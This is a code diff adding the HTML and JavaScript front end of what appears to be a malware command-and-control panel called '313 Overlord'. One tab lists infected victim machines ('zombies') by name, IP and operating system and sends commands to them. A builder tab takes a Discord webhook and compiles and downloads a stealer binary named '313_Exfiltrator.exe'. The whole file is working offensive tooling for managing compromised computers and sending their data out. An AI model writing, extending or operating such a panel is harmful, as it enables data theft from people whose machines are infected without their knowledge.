@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>313 // OVERLORD DASHBOARD</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono&display=swap" rel="stylesheet">
+    <style>
+        body { background-color: #000; color: #fff; font-family: 'JetBrains Mono', monospace; }
+        .sidebar-item.active { background: #fff; color: #000; }
+        .terminal-box { background: #050505; border: 1px solid #1a1a1a; height: 150px; overflow-y: auto; font-size: 10px; }
+        ::-webkit-scrollbar { width: 2px; }
+        ::-webkit-scrollbar-thumb { background: #333; }
+        .node-row:hover { background: rgba(255,255,255,0.02); }
+    </style>
+</head>
+<body class="flex h-screen overflow-hidden">
+
+    <!-- SIDEBAR -->
+    <aside class="w-64 border-r border-zinc-900 flex flex-col p-8 bg-zinc-950/20">
+        <div class="flex items-center space-x-3 mb-12">
+            <div class="w-6 h-6 border border-white flex items-center justify-center font-bold text-xs">313</div>
+            <span class="text-[10px] tracking-widest font-bold">OVERLORD</span>
+        </div>
+        <nav class="flex-1 space-y-4">
+            <button onclick="switchTab('nodes')" id="nav-nodes" class="w-full sidebar-item active flex items-center space-x-4 p-3 text-[10px] uppercase tracking-widest transition">
+                <i data-lucide="terminal" class="w-4 h-4"></i> <span>Active Nodes</span>
+            </button>
+            <button onclick="switchTab('builder')" id="nav-builder" class="w-full sidebar-item flex items-center space-x-4 p-3 text-[10px] uppercase tracking-widest transition">
+                <i data-lucide="plus-square" class="w-4 h-4"></i> <span>Generator</span>
+            </button>
+        </nav>
+        <a href="/logout" class="text-zinc-600 hover:text-white text-[10px] uppercase flex items-center space-x-3 transition">
+            <i data-lucide="power" class="w-4 h-4"></i> <span>System Exit</span>
+        </a>
+    </aside>
+
+    <!-- CONTENT -->
+    <main class="flex-1 p-12 overflow-y-auto bg-black">
+        
+        <!-- TAB: NODES (C2) -->
+        <div id="tab-nodes" class="tab-content">
+            <div class="flex justify-between items-end mb-10 border-b border-zinc-900 pb-6">
+                <h1 class="text-4xl font-bold tracking-tighter uppercase italic">Nodes_</h1>
+                <p class="text-xs text-zinc-500 uppercase">Zombies Online: <span id="count" class="text-white">0</span></p>
+            </div>
+
+            <div class="overflow-hidden border border-zinc-900">
+                <table class="w-full text-left text-[10px]">
+                    <thead class="bg-zinc-900/50 text-zinc-500 uppercase">
+                        <tr>
+                            <th class="p-4">PC Name</th>
+                            <th class="p-4">IP Address</th>
+                            <th class="p-4">Operating System</th>
+                            <th class="p-4">Last Connection</th>
+                            <th class="p-4 text-right">Control</th>
+                        </tr>
+                    </thead>
+                    <tbody id="node-list" class="divide-y divide-zinc-900">
+                        <!-- Loaded via JS -->
+                    </tbody>
+                </table>
+            </div>
+        </div>
+
+        <!-- TAB: BUILDER -->
+        <div id="tab-builder" class="tab-content hidden">
+            <h1 class="text-4xl font-bold tracking-tighter uppercase italic mb-10">Stub Builder_</h1>
+            <div class="grid grid-cols-1 lg:grid-cols-2 gap-10">
+                <form id="buildForm" class="space-y-6 bg-zinc-950/50 p-8 border border-zinc-900">
+                    <div>
+                        <label class="block text-[8px] text-zinc-600 uppercase mb-2">Discord Webhook</label>
+                        <input type="text" name="webhook" required class="w-full bg-black border border-zinc-800 p-4 text-[10px] focus:border-white outline-none">
+                    </div>
+                    <div>
+                        <label class="block text-[8px] text-zinc-600 uppercase mb-2">Validity (Days)</label>
+                        <input type="number" name="expiry_days" value="7" class="w-full bg-black border border-zinc-800 p-4 text-[10px] focus:border-white outline-none">
+                    </div>
+                    <button type="submit" class="w-full bg-white text-black font-bold py-4 text-[10px] tracking-widest hover:bg-zinc-300 transition uppercase">
+                        Compile Payload
+                    </button>
+                </form>
+                <div class="terminal-box p-6" id="term">
+                    <div id="logs" class="text-zinc-500 space-y-1">
+                        <p>> System standby. Awaiting build request...</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <script>
+        lucide.createIcons();
+
+        function switchTab(id) {
+            document.querySelectorAll('.tab-content').forEach(t => t.classList.add('hidden'));
+            document.querySelectorAll('.sidebar-item').forEach(b => b.classList.remove('active'));
+            document.getElementById('tab-' + id).classList.remove('hidden');
+            document.getElementById('nav-' + id).classList.add('active');
+            if (id === 'nodes') loadNodes();
+        }
+
+        async function loadNodes() {
+            const res = await fetch('/api/nodes');
+            const nodes = await res.json();
+            document.getElementById('count').innerText = nodes.length;
+            document.getElementById('node-list').innerHTML = nodes.map(n => `
+                <tr class="node-row transition-all duration-300">
+                    <td class="p-4 text-white font-bold">${n.pc_name}</td>
+                    <td class="p-4 text-zinc-400">${n.ip_address}</td>
+                    <td class="p-4 text-zinc-600">${n.os_info}</td>
+                    <td class="p-4 text-zinc-500">${new Date(n.last_ping).toLocaleString()}</td>
+                    <td class="p-4 text-right">
+                        <button onclick="refreshNode('${n.pc_name}')" class="border border-zinc-800 px-4 py-1 hover:border-white transition uppercase text-[8px] font-bold">Refresh</button>
+                    </td>
+                </tr>
+            `).join('');
+        }
+
+        async function refreshNode(pc) {
+            await fetch('/api/command', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ pc_name: pc })
+            });
+            alert("COMMAND_SENT: FORCE_LOG for " + pc);
+        }
+
+        document.getElementById('buildForm').onsubmit = async (e) => {
+            e.preventDefault();
+            const logs = document.getElementById('logs');
+            const addLog = (t) => { logs.innerHTML += `<p>> ${t}</p>`; document.getElementById('term').scrollTop = 9999; };
+            
+            logs.innerHTML = "";
+            addLog("INITIALIZING 313 COMPILER...");
+            await new Promise(r => setTimeout(r, 700));
+            addLog("INJECTING OVERLAY METADATA...");
+            
+            const formData = new FormData(e.target);
+            const res = await fetch('/build', { method: 'POST', body: new URLSearchParams(formData) });
+            
+            if (res.ok) {
+                addLog("SUCCESS: BINARY ARMED.");
+                const blob = await res.blob();
+                const url = window.URL.createObjectURL(blob);
+                const a = document.createElement('a'); a.href = url; a.download = "313_Exfiltrator.exe"; a.click();
+            } else {
+                addLog("ERROR: COMPILATION_FAILED.");
+            }
+        };
+
+        setInterval(loadNodes, 10000); // Atualiza a tabela a cada 10 segundos
+        loadNodes();
+    </script>
+</body>
+</html>
